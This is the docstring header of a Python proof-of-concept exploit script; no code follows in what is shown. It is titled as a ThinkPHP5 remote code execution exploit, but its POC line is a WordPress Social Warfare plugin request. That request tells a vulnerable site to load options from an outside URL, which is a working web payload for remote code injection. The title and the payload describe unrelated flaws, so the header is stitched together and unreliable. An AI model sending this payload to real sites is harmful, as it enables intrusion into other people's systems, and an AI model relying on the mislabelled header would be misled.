#!/usr/bin/env python		
#coding:utf-8

"""
nmae: ThinkPHP5 <=5.0.22/<=5.1.29 远程代码执行漏洞

Version： ThinkPHP5.0 版本 <= 5.0.22 ThinkPHP5.1 版本 <= 5.1.29

Usage:
	1. python POC-S.py -s 
	2. POC: /wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://lj.s7star.cn/info.txt
	
Referer: https://www.wordfence.com/blog/2019/03/recent-social-warfare-vulnerability-allowed-remote-code-execution/
"""
